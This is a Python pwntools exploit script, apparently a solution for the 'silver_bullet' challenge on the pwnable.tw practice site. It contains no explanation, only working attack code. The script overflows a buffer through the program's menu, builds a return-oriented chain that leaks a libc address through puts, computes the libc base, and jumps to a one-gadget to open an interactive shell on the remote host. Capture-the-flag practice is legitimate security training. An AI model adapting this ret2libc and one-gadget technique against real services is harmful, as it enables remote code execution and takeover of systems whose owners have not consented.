from pwn import *

local = False
elf = 'silver_bullet' 

if local: 
    context.binary = './'+elf
    r = process("./"+elf)
else: 
    ip = "chall.pwnable.tw"
    port = 10103
    r = remote(ip,port)

context.arch = 'i386'
l = ELF('./libc_32.so.6')
raw_input("aa")

r.recv()
r.send('1')
r.recv()
r.send('a'*47)
r.recv()
r.send('2')
r.recv()
r.send('a')
r.recv()
r.send('2')
r.recv()
put_plt = 0x80484a8
got_libc_start = 0x804afec
main = 0x08048954

r.send('\xff' * 7  + p32(put_plt) + p32(main)  +  p32(got_libc_start) + 'a' * 8)
r.recv()
r.send('3')
r.recvuntil("!!\n")
get =  r.recv()
libc =  u32( get[0:4] ) - 0x00018540
l.address = libc
success("libc addr : %s", hex(l.address))

r.send('1')
r.recv()
r.send('a'*47)
r.recv()
r.send('2')
r.recv()
r.send('a')
r.recv()
r.send('2')
r.recv()
r.send('\xff' * 7  + p32(l.address + 0x3a819 ))
r.recv()
r.send('3')

r.interactive()
